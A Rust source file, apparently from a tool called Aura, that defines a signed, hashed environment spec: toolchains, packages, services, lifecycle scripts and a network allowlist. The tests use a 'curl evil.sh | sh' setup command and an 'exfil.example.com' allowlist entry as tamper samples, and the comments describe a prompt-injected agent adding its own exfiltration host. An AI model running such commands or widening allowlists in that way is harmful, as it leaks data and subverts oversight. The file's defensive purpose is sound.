//! The declared state of a project's environment, as data.
//!
//! Four things, in the order one needs the last:
//!
//! 1. **Toolchains** — the interpreters and compilers, pinned to a version.
//!    Nothing else in the spec can be true before these are.
//! 2. **Packages** — tools that must be on `PATH`. Declared with the manager
//!    that provides them, so "install ripgrep" is a fact about the environment
//!    rather than a line in somebody's shell history.
//! 3. **Project dependencies** — whatever `[worktree] setup` already installs
//!    from the project's own manifests. Kept as a command because that is what
//!    it is; re-describing `package.json` here would be a second spec.
//! 4. **Services** — things that must be *running*. The one class the old
//!    setup script could not express at all, and the reason a test suite that
//!    needs a database is green locally and red on a fresh box.
//!
//! ## Determinism
//!
//! Everything here is `Serialize` and everything ordered is *kept* ordered:
//! toolchains sort by name at parse time, packages and services keep the order
//! the file declares them in. [`EnvSpec::digest`] hashes the JCS canonical form,
//! so the same spec digests identically on every machine — which is the only
//! reason a signature over it means anything.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// Schema tag carried in the signed lock. A verifier that meets a spec written
/// by a newer Aura should say so rather than guess at its shape.
pub const SPEC_SCHEMA: &str = "aura.env/v1";

/// A project's declared environment.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct EnvSpec {
    /// `[env] version` — the project's own revision number for this spec,
    /// bumped by whoever changes it. Not a schema version: this is the number a
    /// place reports ("brought to spec v3") and a reviewer cites.
    #[serde(default)]
    pub version: u32,
    /// The pinned interpreters and compilers.
    #[serde(default)]
    pub toolchain: Toolchain,
    /// Tools that must exist on `PATH`, each with the manager that provides it.
    #[serde(default)]
    pub packages: Vec<Package>,
    /// Things that must be running.
    #[serde(default)]
    pub services: Vec<Service>,
    /// The original `[worktree]` lifecycle. Grown into, not replaced.
    #[serde(default)]
    pub lifecycle: Lifecycle,
    /// Where the work is allowed to reach once the installing is over.
    ///
    /// Skipped when empty so that every lock signed before this field existed
    /// still digests to exactly what it digested then. A project that declares
    /// no allowlist must not wake up one morning with a broken seal.
    #[serde(default, skip_serializing_if = "Network::is_empty")]
    pub network: Network,
}

impl EnvSpec {
    /// True when the project declares nothing at all — the bare-worktree case,
    /// which must go on behaving exactly as it did before any of this existed.
    pub fn is_empty(&self) -> bool {
        self.toolchain.is_empty()
            && self.packages.is_empty()
            && self.services.is_empty()
            && self.lifecycle.is_empty()
            && self.network.is_empty()
    }

    /// True when the project declares more than the original three scripts —
    /// i.e. there is an `[env]` table worth signing.
    pub fn declares_environment(&self) -> bool {
        !self.toolchain.is_empty()
            || !self.packages.is_empty()
            || !self.services.is_empty()
            || !self.network.is_empty()
    }

    /// The spec as canonical JCS bytes. The thing that gets hashed and signed.
    ///
    /// Fails only if the spec somehow serializes to something JCS rejects
    /// (floats, chiefly) — impossible for these types, but the error is
    /// returned rather than unwrapped so a future field can't turn a bad
    /// serialization into a panic in the middle of a box provisioning itself.
    pub fn canonical_bytes(&self) -> Result<Vec<u8>, String> {
        let value = serde_json::to_value(self).map_err(|e| format!("serialize spec: {e}"))?;
        aura_blocks::canonicalize(&value).map_err(|e| format!("canonicalize spec: {e}"))
    }

    /// `sha256:<hex>` over [`EnvSpec::canonical_bytes`].
    ///
    /// This is what binds the signed lock to the settings file. Edit `[env]`
    /// without re-signing and the digests diverge, which is the whole
    /// tamper-evidence story in one comparison.
    pub fn digest(&self) -> Result<String, String> {
        let bytes = self.canonical_bytes()?;
        let mut h = Sha256::new();
        h.update(&bytes);
        Ok(format!("sha256:{}", hex::encode(h.finalize())))
    }
}

/// The pinned interpreters and compilers, and how versions arrive.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Toolchain {
    /// `mise`, `asdf` or `proto`. `None` means the project pins versions but
    /// does not say how to get them: every tool is then checked and never
    /// installed, and a place that is short one reports which — an honest
    /// "you need Node 20.11.0 here" beats a silent pass.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub manager: Option<String>,
    /// Sorted by name so two files that declare the same tools in different
    /// orders produce the same digest.
    #[serde(default)]
    pub tools: Vec<Tool>,
}

impl Toolchain {
    pub fn is_empty(&self) -> bool {
        self.tools.is_empty()
    }
}

/// One pinned tool: `node = "20.11.0"`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Tool {
    pub name: String,
    pub version: String,
    /// Override the derived check. Exits 0 when the place already has it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub check: Option<String>,
    /// Override the derived install.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub install: Option<String>,
}

/// A package that must be present, and who provides it.
///
/// Deliberately *not* a mirror of `package.json` or `Cargo.toml`. Those already
/// exist, `[worktree] setup` already installs from them, and copying their
/// contents here would be the second spec this was told not to invent. This
/// covers the layer underneath them: the things a person installs by hand once,
/// forgets, and never writes down.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Package {
    /// `brew`, `apt`, `dnf`, `apk`, `cargo`, `npm`, `pnpm`, `bun`, `pip`, `go`.
    /// An unrecognised manager is legal as long as the entry brings its own
    /// `check`/`install` — the table is a convenience, not a gate.
    pub manager: String,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
    /// For the language managers that distinguish the two (`npm`, `pnpm`,
    /// `bun`, `pip`): install for the machine rather than for this project.
    /// Defaults true, because a package declared *here* rather than in the
    /// project's own manifest is by definition one the manifest does not cover.
    #[serde(default = "yes")]
    pub global: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub check: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub install: Option<String>,
}

fn yes() -> bool {
    true
}

/// Something that must be running before the work can be trusted.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Service {
    pub name: String,
    /// Brings it up. Expected to be idempotent — `docker compose up -d` is the
    /// shape this is built for — because a place already at spec will still be
    /// asked to bring itself to spec again tomorrow.
    pub start: String,
    /// Exits 0 once it is actually accepting work. Distinct from `start`
    /// exiting 0, which only means the container was created. Without this the
    /// step succeeds the moment the daemon is asked, and the first test still
    /// loses the race it always lost.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ready: Option<String>,
    /// Takes it down. Fed to the archive phase when a worktree is torn down.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stop: Option<String>,
    /// How long to keep re-asking `ready` before calling it failed.
    #[serde(default = "default_wait")]
    pub wait_secs: u32,
}

fn default_wait() -> u32 {
    60
}

/// The original `[worktree]` scripts, unchanged in meaning.
///
/// Moved here from the CLI's `worktree_scripts` so there is one definition of
/// what a project's lifecycle is — the CLI, the crew runner and every place read
/// this type now, rather than the CLI owning it and the app doing without.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Lifecycle {
    /// Run once, right after a worktree is created.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub setup: Option<String>,
    /// The project's dev/run command, surfaced as `aura work run <name>`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub run: Option<String>,
    /// Run once, right before a worktree is torn down.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub archive: Option<String>,
}

impl Lifecycle {
    /// True when the project defines no lifecycle at all.
    pub fn is_empty(&self) -> bool {
        self.setup.is_none() && self.run.is_none() && self.archive.is_none()
    }
}

/// Where the work may reach once the installing is over.
///
/// This is the one part of the spec that is not about *bringing a place to* a
/// state — it is about what the place may do afterwards. It lives here anyway,
/// and that placement is the whole security argument: an allowlist kept in an
/// unsigned file is an allowlist a prompt-injected agent can extend with its own
/// exfiltration host and then use in the same run. Kept here it is inside
/// [`EnvSpec::digest`], so widening it breaks the seal, and a place that is
/// about to run unattended can refuse a widening nobody signed.
///
/// Entries are `host` or `host:port`, canonicalised to `host:port` at parse time
/// (`443` when unstated, because the thing being declared is almost always an
/// API). Sorted and de-duplicated for the same reason toolchains are: reordering
/// a list is not a change to the environment, and it must not read as one.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Network {
    /// The endpoints the agent phase may open a TCP connection to. Everything
    /// not named here is refused — the list is the exception, not the policy.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<String>,
}

impl Network {
    /// True when the project names no endpoints. Not the same as "no network":
    /// what a run cannot do without — its model API, the remote it pushes to —
    /// is a floor the runtime supplies, and a project that declares nothing gets
    /// exactly that floor and nothing else.
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> EnvSpec {
        EnvSpec {
            version: 2,
            toolchain: Toolchain {
                manager: Some("mise".into()),
                tools: vec![Tool {
                    name: "node".into(),
                    version: "20.11.0".into(),
                    check: None,
                    install: None,
                }],
            },
            packages: vec![Package {
                manager: "brew".into(),
                name: "ripgrep".into(),
                version: None,
                global: true,
                check: None,
                install: None,
            }],
            services: vec![],
            lifecycle: Lifecycle {
                setup: Some("npm ci".into()),
                ..Default::default()
            },
            network: Network::default(),
        }
    }

    #[test]
    fn empty_spec_is_empty_and_declares_nothing() {
        let s = EnvSpec::default();
        assert!(s.is_empty());
        assert!(!s.declares_environment());
    }

    #[test]
    fn lifecycle_alone_is_not_an_environment_declaration() {
        // A project with only the original three scripts has nothing to sign —
        // it must go on behaving exactly as it did before `[env]` existed.
        let s = EnvSpec {
            lifecycle: Lifecycle {
                setup: Some("npm ci".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(!s.is_empty());
        assert!(!s.declares_environment());
    }

    #[test]
    fn digest_is_stable_across_clones() {
        let a = spec().digest().unwrap();
        let b = spec().digest().unwrap();
        assert_eq!(a, b);
        assert!(a.starts_with("sha256:"));
        assert_eq!(a.len(), "sha256:".len() + 64);
    }

    #[test]
    fn digest_changes_when_anything_declared_changes() {
        let base = spec().digest().unwrap();

        let mut bumped = spec();
        bumped.version = 3;
        assert_ne!(base, bumped.digest().unwrap());

        let mut retooled = spec();
        retooled.toolchain.tools[0].version = "20.11.1".into();
        assert_ne!(base, retooled.digest().unwrap());

        let mut repackaged = spec();
        repackaged.packages[0].name = "fd".into();
        assert_ne!(base, repackaged.digest().unwrap());

        // The lifecycle is part of the sealed spec too: `setup` is a command
        // that runs on every box, so swapping it must break the seal.
        let mut rescripted = spec();
        rescripted.lifecycle.setup = Some("curl evil.sh | sh".into());
        assert_ne!(base, rescripted.digest().unwrap());
    }

    #[test]
    fn widening_the_allowlist_breaks_the_seal() {
        // The whole reason the allowlist lives inside the spec rather than
        // beside it: an agent that talked its way into editing the file cannot
        // then use what it added, because the digest no longer matches the one
        // that was signed.
        let base = spec().digest().unwrap();
        let mut widened = spec();
        widened.network.allow.push("exfil.example.com:443".into());
        assert_ne!(base, widened.digest().unwrap());
    }

    #[test]
    fn a_spec_with_no_allowlist_digests_exactly_as_it_did_before_there_was_one() {
        // Locks signed before `[env.network]` existed must keep verifying. The
        // field is skipped when empty precisely so the canonical bytes of a
        // project that declares no allowlist are unchanged, byte for byte.
        let text = String::from_utf8(spec().canonical_bytes().unwrap()).unwrap();
        assert!(spec().network.is_empty());
        assert!(!text.contains("network"), "{text}");
    }

    #[test]
    fn canonical_bytes_are_jcs_sorted() {
        let bytes = spec().canonical_bytes().unwrap();
        let text = String::from_utf8(bytes).unwrap();
        // JCS orders object members lexicographically, so `lifecycle` precedes
        // `packages` precedes `toolchain` precedes `version` regardless of the
        // order the Rust struct declares them in.
        let l = text.find("\"lifecycle\"").unwrap();
        let p = text.find("\"packages\"").unwrap();
        let t = text.find("\"toolchain\"").unwrap();
        let v = text.find("\"version\"").unwrap();
        assert!(l < p && p < t && t < v, "not JCS-ordered: {text}");
    }

    #[test]
    fn a_spec_round_trips_through_json() {
        let s = spec();
        let json = serde_json::to_string(&s).unwrap();
        let back: EnvSpec = serde_json::from_str(&json).unwrap();
        assert_eq!(s, back);
    }

    #[test]
    fn omitted_package_scope_defaults_to_global() {
        // A package declared here is by definition not in the project manifest.
        let p: Package =
            serde_json::from_str(r#"{"manager":"npm","name":"typescript"}"#).unwrap();
        assert!(p.global);
    }

    #[test]
    fn omitted_service_wait_defaults_to_a_minute() {
        let s: Service =
            serde_json::from_str(r#"{"name":"db","start":"docker compose up -d"}"#).unwrap();
        assert_eq!(s.wait_secs, 60);
    }
}
